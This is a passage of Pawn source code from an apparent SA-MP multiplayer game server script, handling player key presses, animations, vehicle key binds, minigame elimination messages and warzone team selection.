					case 18: ApplyAnimation(playerid,"PED","run_armed",4.1,1,1,1,1,1,1);
					case 19: ApplyAnimation(playerid,"PED","run_csaw",4.1,1,1,1,1,1,1);
					case 20: ApplyAnimation(playerid,"PED","run_rocket",4.1,1,1,1,1,1,1);
				}
				player[playerid][runningon] = 1;
			} else if (oldkeys & KEY_SPRINT && player[playerid][runningon] == 1)
			{
				//ApplyAnimation(playerid, "PED", "sprint_civi",4.1, 0, 1, 1, 0, 1, 1); // sprint
				ApplyAnimation(playerid,"PED","WALK_player",4.1,0,1,1,0,1,1);
				player[playerid][runningon] = 0;
			}
		} else if (player[playerid][walking] > 0)
		{
			if (newkeys & KEY_WALK)
			{
				switch (player[playerid][walking])
				{
					case 1: ApplyAnimation(playerid,"PED","WALK_civi",4.1,1,1,1,1,1,1);
					case 2: ApplyAnimation(playerid,"PED","WOMAN_walknorm",4.1,1,1,1,1,1,1);
					case 3: ApplyAnimation(playerid,"PED","WOMAN_walkbusy",4.1,1,1,1,1,1,1);
					case 4: ApplyAnimation(playerid,"PED","WALK_DRUNK",4.1,1,1,1,1,1,1);
					case 5: ApplyAnimation(playerid,"PED","WALK_gang1",4.1,1,1,1,1,1,1);
					case 6: ApplyAnimation(playerid,"PED","WALK_gang2",4.1,1,1,1,1,1,1);
					case 7: ApplyAnimation(playerid,"PED","WALK_fat",4.1,1,1,1,1,1,1);
					case 8: ApplyAnimation(playerid,"PED","WALK_fatold",4.1,1,1,1,1,1,1);
					case 9: ApplyAnimation(playerid,"PED","WOMAN_walkfatold",4.1,1,1,1,1,1,1);
					case 10: ApplyAnimation(playerid,"PED","WOMAN_walkold",4.1,1,1,1,1,1,1);
					case 11: ApplyAnimation(playerid,"PED","WALK_old",4.1,1,1,1,1,1,1);
					case 12: ApplyAnimation(playerid,"PED","WALK_shuffle",4.1,1,1,1,1,1,1);
					case 13: ApplyAnimation(playerid,"PED","Walk_Wuzi",4.1,1,1,1,1,1,1);
					case 14: ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.1,1,1,1,1,1,1);
					case 15: ApplyAnimation(playerid,"PED","WOMAN_walksexy",4.1,1,1,1,1,1,1);
					case 16: ApplyAnimation(playerid,"PED","WOMAN_walkshop",4.1,1,1,1,1,1,1);
					case 17: ApplyAnimation(playerid,"PED","FightShF",4.1,1,1,1,1,1,1);
					case 18: ApplyAnimation(playerid,"PED","FightSh_FWD",4.1,1,1,1,1,1,1);
					case 19: ApplyAnimation(playerid,"PED","Player_Sneak",4.1,1,1,1,1,1,1);
					case 20: ApplyAnimation(playerid,"PED","GunCrouchFwd",4.1,1,1,1,1,1,1);
					case 21: ApplyAnimation(playerid,"PED","GunMove_FWD",4.1,1,1,1,1,1,1);
					case 22: ApplyAnimation(playerid,"PED","WALK_armed",4.1,1,1,1,1,1,1);
					case 23: ApplyAnimation(playerid,"PED","WALK_csaw",4.1,1,1,1,1,1,1);
					case 24: ApplyAnimation(playerid,"PED","WALK_rocket",4.1,1,1,1,1,1,1);
				}
				player[playerid][walkingon] = 1;
			} else if (oldkeys & KEY_WALK && player[playerid][walkingon] == 1)
			{
				ApplyAnimation(playerid,"PED","WALK_player",4.1,0,1,1,0,1,1);
				player[playerid][walkingon] = 0;
			}
		} else if (player[playerid][skating] == 1)
		{
			if (newkeys & KEY_SPRINT) ApplyAnimation(playerid, "SKATE", "skate_sprint",4.1, 1, 1, 1, 1, 1, 1); // sprint
			else ApplyAnimation(playerid, "SKATE", "skate_idle",4.1, 1, 1, 1, 1, 1, 1); // stand still/idle
	 	} else if (player[playerid][swimming] == 1)
		{
			if (newkeys & KEY_SPRINT) ApplyAnimation(playerid, "SWIM", "SWIM_crawl",4.1, 1, 1, 1, 1, 1, 1); // sprint
			else ApplyAnimation(playerid, "SWIM", "Swim_Glide",4.1, 1, 1, 1, 1, 1, 1); // stand still/idle
	 	} else if (newkeys & KEY_SECONDARY_ATTACK)
		{
		    if (player[playerid][InShamal] != -1)
		    {
				new Float:shpos[4];

				GetVehiclePos(player[playerid][InShamal], shpos[0], shpos[1], shpos[2]);
				GetVehicleZAngle(player[playerid][InShamal], shpos[3]);
				shpos[0] +=(5*floatsin(-floatsub(shpos[3],45.0), degrees)),
				shpos[1] +=(5*floatcos(-floatsub(shpos[3],45.0), degrees));
				SetPlayerPosEx(playerid, shpos[0], shpos[1], floatsub(shpos[2],0.94), shpos[3], 0);
				player[playerid][InShamal] = -1;
			} else {
				if (!AntiSpam(playerid, 3, false)) return 1;

				new Float:x,
					Float:y,
					Float:z,
					closestvehicle;

				GetPlayerPos(playerid, x, y, z);
				GetVehicleWithinDistance(x, y, z, 15.0, closestvehicle);
				if (IsVehicleRcTram(closestvehicle))
				PutPlayerInVehicle(playerid, closestvehicle, 0);
			}
		} else if (player[playerid][playingcc] == 1 && playerid != currentcccriminal)
		{
		    if (newkeys & KEY_YES)
		    {
		    	if (player[playerid][playerccmode] == 0 ) // mode 0: standby, mode 1: on foot, mode 2: in vehicle
		    	{
		    	    SetPlayerColor(playerid, COLOR_RED);
		    	    player[playerid][playerccmode] = 1;
		    	} else {
		    	    SetPlayerColor(playerid, COLOR_INVISIBLE);
		    	    player[playerid][playerccmode] = 0;
		    	}
		    	UpdateCCStatus();
		    }
		}
	} else { // is in a vehicle
		if (player[playerid][ramps] == 1)
		{
		    if (newkeys & KEY_ACTION)
		    {
		  		if (!AntiSpam(playerid, 1, false)) return 1;

				if (IsPlayerDriver(playerid))
				{ // De[M]oN
			   		new Float:rpos[4],
						Float:r2pos[3];

					GetPlayerPos(playerid, rpos[0], rpos[1], rpos[2]);
					GetVehicleZAngle( GetPlayerVehicleID(playerid), rpos[3]);
					r2pos[0] = rpos[0] + (15 * floatsin(-rpos[3]+5, degrees));
					r2pos[1] = rpos[1] + (15 * floatcos(-rpos[3]+5, degrees));
					new dobject = CreatePlayerObject(playerid,1655,r2pos[0],r2pos[1],rpos[2]-0.5,0,0, rpos[3]);
					SetTimerEx("DeletePlayerObject", 1500, 0, "ii", playerid, dobject);
	   			}
			}
		} else if (newkeys & KEY_SUBMISSION)
		{
		    if (player[playerid][vehiclebind] != 0 && IsPlayerDriver(playerid) && !IsPlayerInDMSPJA(playerid))
		    {
		        //printf("[DEBUG] Called BIND: %d", player[playerid][vehiclebind]);
		        new vehiclebID = GetPlayerVehicleID(playerid);
		        switch(player[playerid][vehiclebind])
				{
				    case 1:
			    	{
					    if (!IsPlayerAdminLevel(playerid, 3))
					    {
							if (!AntiSpam(playerid, 1)) return 1;
						}

					    new Float:vX,
							Float:vY,
							Float:vZ,
							Float:vA;

						GetVehiclePos(vehiclebID, vX, vY, vZ);
						SetVehiclePos(vehiclebID, vX, vY, vZ + 2.5);
						GetVehicleZAngle(vehiclebID, vA);
						SetVehicleZAngle(vehiclebID, vA);
				    }
				    case 2:
				    {
				        if (!IsPlayerAdminLevel(playerid, 3))
				        {
							if (!AntiSpam(playerid, 2)) return 1;
						}

					    new Float:vX,
							Float:vY,
							Float:vZ,
							Float:vA;

						GetVehicleVelocity(vehiclebID, vX, vY, vZ);
						GetVehicleZAngle(vehiclebID, vA);
						vX += ( 0.3 * floatsin( -vA, degrees ) );
			            vY += ( 0.3 * floatcos( -vA, degrees ) );
						SetVehicleVelocity(vehiclebID, vX, vY, vZ+0.4);
				    }
				    case 3:
				    {
				        if (!IsPlayerAdminLevel(playerid, 3))
				        {
							if (!AntiSpam(playerid, 2)) return 1;
						}

					    new Float:vX,
							Float:vY,
							Float:vZ,
							Float:vA;

						GetVehicleVelocity(vehiclebID, vX, vY, vZ);
						GetVehicleZAngle(vehiclebID, vA);
						vX += ( 0.6 * floatsin( -vA, degrees ) );
			            vY += ( 0.6 * floatcos( -vA, degrees ) );
						SetVehicleVelocity(vehiclebID, vX, vY, vZ+0.8);
				    }
				    case 4:
				    {
				        if (!IsPlayerAdminLevel(playerid, 3))
				        {
							if (!AntiSpam(playerid, 2)) return 1;
						}

					    new Float:vX,
							Float:vY,
							Float:vZ,
							Float:vA;

						GetVehicleVelocity(vehiclebID, vX, vY, vZ);
						GetVehicleZAngle(vehiclebID, vA);
						vX += ( 0.6 * floatsin( -vA, degrees ) );
			            vY += ( 0.6 * floatcos( -vA, degrees ) );
						SetVehicleVelocity(vehiclebID, vX, vY, vZ+1.4);
				    }
				    case 5:
				    {
				        if (!IsPlayerAdminLevel(playerid, 3))
				        {
							if (!AntiSpam(playerid, 2)) return 1;
						}

						new Float:vX,
							Float:vY,
							Float:vZ,
							Float:DV,
							Float:multiple;

						GetVehicleVelocity(vehiclebID, vX, vY, vZ);
						DV = floatsqroot(vX*vX + vY*vY + vZ*vZ);
						if (DV > 0)
						{
							multiple = ((player[playerid][savedms] + DV) / (DV));
							SetVehicleVelocity(vehiclebID, vX*multiple, vY*multiple, vZ*multiple);

							GetPlayerName(playerid, playername, sizeof(playername));
							format(strings, sizeof(strings), "[A-1] "EMBED_IVORY"%s has used /movespeed", playername);

							for (new a = 0; a < MAX_PLAYERS; a++)
							{
							    if (IsPlayerConnected(a) && player[a][ADMIN] > 0 && player[a][adminmsgs] == 1)
								SendClientMessage(a, COLOR_RED, strings);
							}
							format(logstring, sizeof(logstring), "[A-1] %s has used /movespeed", playername);
							printflog("ADM-MSG", logstring);
						}
				    }
				    case 6:
				    {
						new engine,
							lights,
							alarm,
							doors,
							bonnet,
							boot,
							objective;

						GetVehicleParamsEx(vehiclebID, engine, lights, alarm, doors, bonnet, boot, objective);
						if (lights == 1) lights = 0;
						else lights = 1;
						SetVehicleParamsEx(vehiclebID, engine, lights, alarm, doors, bonnet, boot, objective);
				    }
				    case 7:
				    {
						AddVehicleComponent(vehiclebID , 1010);
				    }
				    case 8:
				    {
						ChangeVehicleColor(vehiclebID, random(250), random(250));
				    }
				    case 9:
				    {
				    	ChangeVehiclePaintjob(vehiclebID, random(3));
				    }
				    case 10:
				    {
						new engine,
							lights,
							alarm,
							doors,
							bonnet,
							boot,
							objective;

						GetVehicleParamsEx(vehiclebID, engine, lights, alarm, doors, bonnet, boot, objective);
						if (bonnet == 1) bonnet = 0;
						else bonnet = 1;
						SetVehicleParamsEx(vehiclebID, engine, lights, alarm, doors, bonnet, boot, objective);
				    }
				    case 11:
				    {
						new engine,
							lights,
							alarm,
							doors,
							bonnet,
							boot,
							objective;

						GetVehicleParamsEx(vehiclebID, engine, lights, alarm, doors, bonnet, boot, objective);
						if (boot == 1) boot = 0;
						else boot = 1;
						SetVehicleParamsEx(vehiclebID, engine, lights, alarm, doors, bonnet, boot, objective);
				    }
				    case 12:
				    {
				        if (!IsPlayerAdminLevel(playerid, 3))
				        {
							if (!AntiSpam(playerid, 2)) return 1;
						}

						new Float:vX,
							Float:vY,
							Float:vZ,
							Float:vA;

						GetVehicleVelocity(vehiclebID, vX, vY, vZ);
						GetVehicleZAngle(vehiclebID, vA);
						SetVehicleZAngle(vehiclebID, vA+180);
						SetVehicleVelocity(vehiclebID, -vX, -vY, -vZ);

						GetPlayerName(playerid, playername, sizeof(playername));
						format(strings, sizeof(strings), "[A-1] "EMBED_IVORY"%s has used /reverse", playername);

						for (new a = 0; a < MAX_PLAYERS; a++)
						{
						    if (IsPlayerConnected(a) && player[a][ADMIN] > 0 && player[a][adminmsgs] == 1)
							SendClientMessage(a, COLOR_RED, strings);
						}
						printflog("ADM-MSG", strings);
				    }
				    case 13:
				    {
						new engine,
							lights,
							alarm,
							doors,
							bonnet,
							boot,
							objective;

						GetVehicleParamsEx(vehiclebID, engine, lights, alarm, doors, bonnet, boot, objective);
						if (objective == 1) objective = 0;
						else objective = 1;
						SetVehicleParamsEx(vehiclebID, engine, lights, alarm, doors, bonnet, boot, objective);
						vehicle[vehiclebID][Objective] = objective;
					}
				}
		    }
		} else if (newkeys & KEY_FIRE)
		{
			if (GetVehicleModel( GetPlayerVehicleID(playerid) ) == 564)
			{
				if (!AntiSpam(playerid, 2, false)) return 1;

			    new Float:Xt,
					Float:Yt,
					Float:Zt;

				GetVehiclePos( GetPlayerVehicleID(playerid) , Xt, Yt, Zt);
				GetXYInFrontOfPlayer(playerid, Xt, Yt, 7.5);
				CreateExplosion(Xt, Yt, Zt, 12, 0.0005);
			}
		} else if (newkeys & KEY_ANALOG_DOWN && andromadacheckpoint == false)
	  	{
			if (GetVehicleModel( GetPlayerVehicleID(playerid) ) == 592)
		    {
	       		andromadacheckpoint = true;
		        andromadavehicleid = GetPlayerVehicleID(playerid);
	     		GetVehiclePos( andromadavehicleid, playerxyza[0], playerxyza[1], playerxyza[2]);
	     		GetXYBehindPlayer(playerid, playerxyza[0], playerxyza[1], 20);
				MoveDynamicObject(andromadadoor, 1002.97, 1023.84, 990.00, 4);
	  		    new Float:playerxyza2[3], pVW = GetPlayerVirtualWorld(playerid);
			    GetVehiclePos(andromadavehicleid, playerxyza2[0], playerxyza2[1], playerxyza2[2]);
	       		for (new r = 0; r < MAX_PLAYERS; r++)
				{
					if (IsPlayerConnected(r) && GetPlayerVirtualWorld(r) == pVW)
					{
						if (player[r][InAndromada] == -1) SetPlayerRaceCheckpoint(r, 4, playerxyza[0], playerxyza[1], playerxyza[2]-1.5, playerxyza2[0], playerxyza2[1], playerxyza2[2]-1.5, 3.0);
						else SetPlayerRaceCheckpoint(r, 4, 1000.12, 1027.43, 993.70, 1000.00, 1017.45, 993.70, 3.0);
					}
				}
		    }
		} else if (newkeys == KEY_ANALOG_UP && andromadacheckpoint == true && GetPlayerVehicleID(playerid) == andromadavehicleid)
     	{
     	    andromadacheckpoint = false;
      		andromadavehicleid = -1;
			MoveDynamicObject(andromadadoor, 1002.97, 1023.84, 994.41, 4);
       		for (new r = 0; r < MAX_PLAYERS; r++)
			{
				if (IsPlayerConnected(r))
				DisablePlayerRaceCheckpoint(r);
			}
	  	} else if (newkeys & KEY_SECONDARY_ATTACK)
		{
			if (!AntiSpam(playerid, 3, false)) return 1;

			new Float:x,
				Float:y,
				Float:z;

			new vID = GetPlayerVehicleID(playerid);
			if (GetVehicleModel(vID) != 449 && (IsVehicleRcTram(vID) || GetVehicleModel(vID) == 594))
			{
				player[playerid][antifall] = 0;
				GetPlayerPos(playerid, x, y, z);
				SetPlayerPos(playerid, x+0.5, y, z+1.0);
				SetCameraBehindPlayer(playerid);
			}
		} else if (newkeys & KEY_YES)
		{
		    if (player[playerid][playingcc] == 1 && playerid != currentcccriminal)
		    {
		    	if (player[playerid][playerccmode] == 0) // mode 0: standby, mode 1: on foot, mode 2: in vehicle
		    	{
		    	    SetPlayerColor(playerid, COLOR_BLUE);
		    	    player[playerid][playerccmode] = 2;
		    	} else {
		    	    SetPlayerColor(playerid, COLOR_INVISIBLE);
		    	    player[playerid][playerccmode] = 0;
		    	}
		    	UpdateCCStatus();
		    }
		}
	} // end of onfoot-invehicle keys
	
	if (player[playerid][PMSGtextdraw] != -1)
	{
	/*
	Help intro
	Player 1-6
	Vehicle
	Teleport
	Object
	Misc
	Premium
	Admin
	*/
	
	    if (newkeys & KEY_YES)
	    {
	        switch(player[playerid][PMSGtextdraw])
	        {
		        case TD_MODE_PLAY1 .. TD_MODE_PLAY6:
				{
				    if (player[playerid][PMSGtextdraw] < TD_MODE_PLAY6) player[playerid][PMSGtextdraw]++;
					else player[playerid][PMSGtextdraw] = TD_MODE_PLAY1;
				}
		        case TD_MODE_VEHI1 .. TD_MODE_VEHI3:
				{
				    if (player[playerid][PMSGtextdraw] < TD_MODE_VEHI3) player[playerid][PMSGtextdraw]++;
					else player[playerid][PMSGtextdraw] = TD_MODE_VEHI1;
				}
		        case TD_MODE_TELE1 .. TD_MODE_TELE2:
				{
				    if (player[playerid][PMSGtextdraw] < TD_MODE_TELE2) player[playerid][PMSGtextdraw]++;
					else player[playerid][PMSGtextdraw] = TD_MODE_TELE1;
				}
		        case TD_MODE_OBJE1 .. TD_MODE_OBJE3:
				{
				    if (player[playerid][PMSGtextdraw] < TD_MODE_OBJE3) player[playerid][PMSGtextdraw]++;
					else player[playerid][PMSGtextdraw] = TD_MODE_OBJE1;
				}
		        case TD_MODE_MISC1 .. TD_MODE_MISC4:
				{
				    if (player[playerid][PMSGtextdraw] < TD_MODE_MISC4) player[playerid][PMSGtextdraw]++;
					else player[playerid][PMSGtextdraw] = TD_MODE_MISC1;
				}
		        case TD_MODE_PREM1 .. TD_MODE_PREM6:
				{
				    if (player[playerid][PMSGtextdraw] < TD_MODE_PREM6) player[playerid][PMSGtextdraw]++;
					else player[playerid][PMSGtextdraw] = TD_MODE_PREM1;
				}
		        case TD_MODE_ADMI1 .. TD_MODE_ADMI13:
				{
				    if (player[playerid][PMSGtextdraw] < TD_MODE_ADMI13) player[playerid][PMSGtextdraw]++;
					else player[playerid][PMSGtextdraw] = TD_MODE_ADMI1;
				}
	        }
	        SetHelpTD(playerid, player[playerid][PMSGtextdraw]);
		} else if (newkeys & KEY_NO)
		{
	        switch(player[playerid][PMSGtextdraw])
	        {
		        case TD_MODE_INTRO:
		        {
					TextDrawHideForPlayer(playerid, pmsg1[playerid]);
					TextDrawHideForPlayer(playerid, pmsg2[playerid]);
					TextDrawHideForPlayer(playerid, pmsg3[playerid]);
					TextDrawHideForPlayer(playerid, pmsg4[playerid]);
					TextDrawHideForPlayer(playerid, pmsg5[playerid]);
					player[playerid][PMSGtextdraw] = -1;
		        }
		        case TD_MODE_PLAY1 .. TD_MODE_PLAY6:
				{
				    if (player[playerid][PMSGtextdraw] > TD_MODE_PLAY1) player[playerid][PMSGtextdraw]--;
					else player[playerid][PMSGtextdraw] = TD_MODE_INTRO;
				}
		        case TD_MODE_VEHI1 .. TD_MODE_VEHI3:
				{
				    if (player[playerid][PMSGtextdraw] > TD_MODE_VEHI1) player[playerid][PMSGtextdraw]--;
					else player[playerid][PMSGtextdraw] = TD_MODE_INTRO;
				}
		        case TD_MODE_TELE1 .. TD_MODE_TELE2:
				{
				    if (player[playerid][PMSGtextdraw] > TD_MODE_TELE1) player[playerid][PMSGtextdraw]--;
					else player[playerid][PMSGtextdraw] = TD_MODE_INTRO;
				}
		        case TD_MODE_OBJE1 .. TD_MODE_OBJE3:
				{
				    if (player[playerid][PMSGtextdraw] > TD_MODE_OBJE1) player[playerid][PMSGtextdraw]--;
					else player[playerid][PMSGtextdraw] = TD_MODE_INTRO;
				}
		        case TD_MODE_MISC1 .. TD_MODE_MISC4:
				{
				    if (player[playerid][PMSGtextdraw] > TD_MODE_MISC1) player[playerid][PMSGtextdraw]--;
					else player[playerid][PMSGtextdraw] = TD_MODE_INTRO;
				}
		        case TD_MODE_PREM1 .. TD_MODE_PREM6:
				{
				    if (player[playerid][PMSGtextdraw] > TD_MODE_PREM1) player[playerid][PMSGtextdraw]--;
					else player[playerid][PMSGtextdraw] = TD_MODE_INTRO;
				}
		        case TD_MODE_ADMI1 .. TD_MODE_ADMI13:
				{
				    if (player[playerid][PMSGtextdraw] > TD_MODE_ADMI1) player[playerid][PMSGtextdraw]--;
					else player[playerid][PMSGtextdraw] = TD_MODE_INTRO;
				}
				
				case TD_MODE_GETINFO:
				{
					TextDrawHideForPlayer(playerid, pmsg1[playerid]);
					TextDrawHideForPlayer(playerid, pmsg2[playerid]);
					TextDrawHideForPlayer(playerid, pmsg3[playerid]);
					TextDrawHideForPlayer(playerid, pmsg4[playerid]);
					TextDrawHideForPlayer(playerid, pmsg5[playerid]);
					player[playerid][SpectatingInfo] = -1;
					player[playerid][PMSGtextdraw] = -1;
				}
	        }
			SetHelpTD(playerid, player[playerid][PMSGtextdraw]);
		}
	}
	return 1;
}

public OnPlayerEnterDynamicArea(playerid, areaid)
{
	if (areaid == spawnareaid || areaid == spawnareaid2)
	{
		ResetPlayerWeapons(playerid);

		new VehicleID = GetPlayerVehicleID(playerid);
		if (VehicleID)
		{
		    if (ForbiddenSpawnVehicles( GetVehicleModel(VehicleID) ))
		    {
			    DestroyVehicle(VehicleID);
				SendClientMessage(playerid, COLOR_RED, "[INFO]: We do not allow any weapons and armed vehicles inside spawn areas! (in world 0)");
			}
		}
	}
	return 1;
}

public OnPlayerLeaveDynamicArea(playerid, areaid)
{
	if (nbstarted == true && player[playerid][playingnb] == 1)
	{
		if (areaid == nbfieldteam1 && player[playerid][playernbteam] == 1 && player[playerid][playernbmode] == 1 || areaid == nbfieldteam2 && player[playerid][playernbteam] == 2 && player[playerid][playernbmode] == 1)
	    {
	        switch (random(15))
	        {
 				case 0:		RemoveNBPlayer(playerid, "Lost his pants in the war");
 				case 1:		RemoveNBPlayer(playerid, "Diarrhea overload");
 				case 2:		RemoveNBPlayer(playerid, "Too much viagra");
 				case 3:		RemoveNBPlayer(playerid, "Saw the reflection of his ugly face in the mirror");
 				case 4:		RemoveNBPlayer(playerid, "Swallowed a toothpick");
 				case 5:		RemoveNBPlayer(playerid, "Raped by the 7 dwarfs");
 				case 6:		RemoveNBPlayer(playerid, "Assassinated with a spoon");
 				case 7:		RemoveNBPlayer(playerid, "Death from holding his pee in");
 				case 8:		RemoveNBPlayer(playerid, "Had an appointment with the dentist");
 				case 9:		RemoveNBPlayer(playerid, "Had an appointment with the gynaecologist");
 				case 10:	RemoveNBPlayer(playerid, "Grenade got stuck up his buttocks");
 				case 11:	RemoveNBPlayer(playerid, "Died while looking for his contact lenses");
 				case 12:	RemoveNBPlayer(playerid, "Had his shoes blown away");
 				case 13:	RemoveNBPlayer(playerid, "Couldn't figure out which team he was in");
 				case 14:	RemoveNBPlayer(playerid, "Thought he could fly like Superman");
  			}
		}
	}
	return 1;
}

public OnPlayerEnterDynamicCP(playerid, checkpointid)
{
	if (checkpointid == warzonecheckpoint_base)
	{
	    if (player[playerid][playerwarzoneteam] == 1 && warzonesecondslefttillcap == 31)
	    {
		    warzonesecondslefttillcap = 30; // start counting
		    SetPlayerColor(playerid, COLOR_INVISIBLE);
	    }
	}
	return 1;
}

public OnPlayerLeaveDynamicCP(playerid, checkpointid)
{
	if (checkpointid == warzonecheckpoint_base)
	{
	    if (warzonesecondslefttillcap < 31)
	    {
			if (player[playerid][playerwarzoneteam] == 1)
			{
				SetPlayerColor(playerid, warzonecolourattackers);
				for (new wzPlayer = 0; wzPlayer < MAX_WARZONE_PLAYERS; wzPlayer++)
				{
					if (!IsPlayerConnected( warzoneplayerlist[wzPlayer] ) || warzoneplayerlist[wzPlayer] == -1)
					continue;

				    if (player[ warzoneplayerlist[wzPlayer] ][playerwarzoneteam] == 2)
				    SetPlayerMarkerForPlayer(warzoneplayerlist[wzPlayer], playerid, (  warzonecolourattackers & COLOR_INVISIBLE ) );
				    
					else if (player[ warzoneplayerlist[wzPlayer] ][playerwarzonemode] == 1)
					{
					    if (IsPlayerInDynamicCP(warzoneplayerlist[wzPlayer], warzonecheckpoint_base))
					    {
						    SetPlayerColor(warzoneplayerlist[wzPlayer], COLOR_INVISIBLE);
						    return 1; // continue counting
					    }
				    }

				}
			} /*else { // only attackers can capture checkpoint!
				SetPlayerColor(playerid, warzonecolourdefenders);
				for (new wzPlayer = 0; wzPlayer < MAX_WARZONE_PLAYERS; wzPlayer++)
				{
					if (!IsPlayerConnected( warzoneplayerlist[wzPlayer] ) || warzoneplayerlist[wzPlayer] == -1)
					continue;

				    if (player[ warzoneplayerlist[wzPlayer] ][playerwarzoneteam] == 1)
				    SetPlayerMarkerForPlayer(warzoneplayerlist[wzPlayer],  playerid, (  warzonecolourdefenders & COLOR_INVISIBLE ) );
				}
			}*/
			
			warzonesecondslefttillcap = 31; // else stop counting and reset
		}
	}
	return 1;
}

public OnPlayerEnterDynamicRaceCP(playerid, checkpointid)
{
	if (checkpointid == warzonecheckpoint_airborne)
	{
	    GivePlayerWeapon(playerid, 46, 1);
        SetPlayerPos(playerid, warzonecpx, warzonecpy, warzonecpz+1500);
        SetPlayerInterior(playerid, 0);
	}
	return 1;
}

public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
    if (clickedid == wzteamtd2)
    {
        if (player[playerid][playerwarzoneteam] > 0)
		{
			TextDrawHideForPlayer(playerid, wzteamtd1);
			TextDrawHideForPlayer(playerid, wzteamtd2);
			TextDrawHideForPlayer(playerid, wzteamtd3);
	    	CancelSelectTextDraw(playerid);
		    return 1;
		}
        
	    if (warzoneattackers > warzonedefenders)
	    {
			SendServerMessage(playerid, EMBED_SPRINGGREEN, "This team is currently overloaded.");
			return 1;
	    }

		warzoneattackers++;
        player[playerid][playerwarzoneteam] = 1;
		player[playerid][moviecrew] = GROUP_ATTACKERS;
	 	SetPlayerTeam(playerid, TEAM_ATTACKERS);

		TextDrawHideForPlayer(playerid, wzteamtd1);
		TextDrawHideForPlayer(playerid, wzteamtd2);
		TextDrawHideForPlayer(playerid, wzteamtd3);

		TextDrawShowForPlayer(playerid, wzweaponsettd1);
		TextDrawShowForPlayer(playerid, wzweaponsettd2);
		TextDrawShowForPlayer(playerid, wzweaponsettd3);
		TextDrawShowForPlayer(playerid, wzweaponsettd4);
		TextDrawShowForPlayer(playerid, wzweaponsettd5);
		SelectTextDraw(playerid, COLOR_GREY);
    } else if (clickedid == wzteamtd3)
    {
        if (player[playerid][playerwarzoneteam] > 0)
		{
			TextDrawHideForPlayer(playerid, wzteamtd1);
			TextDrawHideForPlayer(playerid, wzteamtd2);
			TextDrawHideForPlayer(playerid, wzteamtd3);
	    	CancelSelectTextDraw(playerid);
		    return 1;
		}
    
	    if (warzonedefenders > warzoneattackers)
	    {
			SendServerMessage(playerid, EMBED_SPRINGGREEN, "This team is currently overloaded.");
			return 1;
	    }

		warzonedefenders++;
        player[playerid][playerwarzoneteam] = 2;
		player[playerid][moviecrew] = GROUP_DEFENDERS;
	 	SetPlayerTeam(playerid, TEAM_DEFENDERS);

		TextDrawHideForPlayer(playerid, wzteamtd1);
		TextDrawHideForPlayer(playerid, wzteamtd2);
		TextDrawHideForPlayer(playerid, wzteamtd3);

		TextDrawShowForPlayer(playerid, wzweaponsettd1);
		TextDrawShowForPlayer(playerid, wzweaponsettd2);
		TextDrawShowForPlayer(playerid, wzweaponsettd3);
		TextDrawShowForPlayer(playerid, wzweaponsettd4);
		TextDrawShowForPlayer(playerid, wzweaponsettd5);
		SelectTextDraw(playerid, COLOR_GREY);
    } else if (clickedid == wzweaponsettd1)
    {
        if (player[playerid][playerwarzoneset] > 0)
		{
	  		TextDrawHideForPlayer(playerid, wzweaponsettd1);
			TextDrawHideForPlayer(playerid, wzweaponsettd2);
			TextDrawHideForPlayer(playerid, wzweaponsettd3);
			TextDrawHideForPlayer(playerid, wzweaponsettd4);
			TextDrawHideForPlayer(playerid, wzweaponsettd5);
	    	CancelSelectTextDraw(playerid);
		    return 1;
		}

		ResetPlayerWeapons(playerid);
		player[playerid][playerwarzoneset] = 1;

  		TextDrawHideForPlayer(playerid, wzweaponsettd1);
		TextDrawHideForPlayer(playerid, wzweaponsettd2);
		TextDrawHideForPlayer(playerid, wzweaponsettd3);
		TextDrawHideForPlayer(playerid, wzweaponsettd4);
		TextDrawHideForPlayer(playerid, wzweaponsettd5);
    	CancelSelectTextDraw(playerid);

		TextDrawShowForPlayer(playerid, wzhelptd1);
		TextDrawShowForPlayer(playerid, wzhelptd2);
		
		GetPlayerName(playerid, playername, sizeof(playername));
		if (player[playerid][playerwarzoneteam] == 1)
		{
			strings = "Attacker/Assault";
			stringe = "Attacker";
		} else {
			strings = "Defender/Assault";
			stringe = "Defender";
		}
		for (new acp = 0; acp < MAX_PLAYERS; acp++)
		{
			if (IsPlayerConnected(acp) && player[acp][playingwarzone] == 1)
			{
			    if (player[acp][playerwarzoneteam] == player[playerid][playerwarzoneteam]) SendPlayerMessageToPlayer(acp, playerid, strings);
				else SendPlayerMessageToPlayer(acp, playerid, stringe);
			}
		}
    } else if (clickedid == wzweaponsettd2)
    {
        if (player[playerid][playerwarzoneset] > 0)
		{
	  		TextDrawHideForPlayer(playerid, wzweaponsettd1);
			TextDrawHideForPlayer(playerid, wzweaponsettd2);
			TextDrawHideForPlayer(playerid, wzweaponsettd3);
			TextDrawHideForPlayer(playerid, wzweaponsettd4);
			TextDrawHideForPlayer(playerid, wzweaponsettd5);
	    	CancelSelectTextDraw(playerid);
		    return 1;
		}
    
		/*if (player[playerid][playerwarzoneteam] == 1)
		{
	        if (warzoneattackersset2limit+1 == warzoneattackers/2)
			return SendServerMessage(playerid, EMBED_SPRINGGREEN, "This weapon set is limited and currently unavailable. (Maximum 1 per 3 players)");
			else warzoneattackersset2limit++;
		} else {
	        if (warzonedefendersset2limit+1 == warzonedefenders/2)
			return SendServerMessage(playerid, EMBED_SPRINGGREEN, "This weapon set is limited and currently unavailable. (Maximum 1 per 3 players)");
			else warzonedefendersset2limit++;
		}*/

		ResetPlayerWeapons(playerid);
		player[playerid][playerwarzoneset] = 2;

  		TextDrawHideForPlayer(playerid, wzweaponsettd1);
		TextDrawHideForPlayer(playerid, wzweaponsettd2);
		TextDrawHideForPlayer(playerid, wzweaponsettd3);
		TextDrawHideForPlayer(playerid, wzweaponsettd4);
		TextDrawHideForPlayer(playerid, wzweaponsettd5);
    	CancelSelectTextDraw(playerid);

		TextDrawShowForPlayer(playerid, wzhelptd1);
		TextDrawShowForPlayer(playerid, wzhelptd2);
		
		GetPlayerName(playerid, playername, sizeof(playername));
		if (player[playerid][playerwarzoneteam] == 1)
		{
			strings = "Attacker/Support";
			stringe = "Attacker";
		} else {
			strings = "Defender/Support";
			stringe = "Defender";
		}
		for (new acp = 0; acp < MAX_PLAYERS; acp++)
		{
			if (IsPlayerConnected(acp) && player[acp][playingwarzone] == 1)
			{
			    if (player[acp][playerwarzoneteam] == player[playerid][playerwarzoneteam]) SendPlayerMessageToPlayer(acp, playerid, strings);
				else SendPlayerMessageToPlayer(acp, playerid, stringe);
			}
		}
    } else if (clickedid == wzweaponsettd3)
    {
        if (player[playerid][playerwarzoneset] > 0)
		{
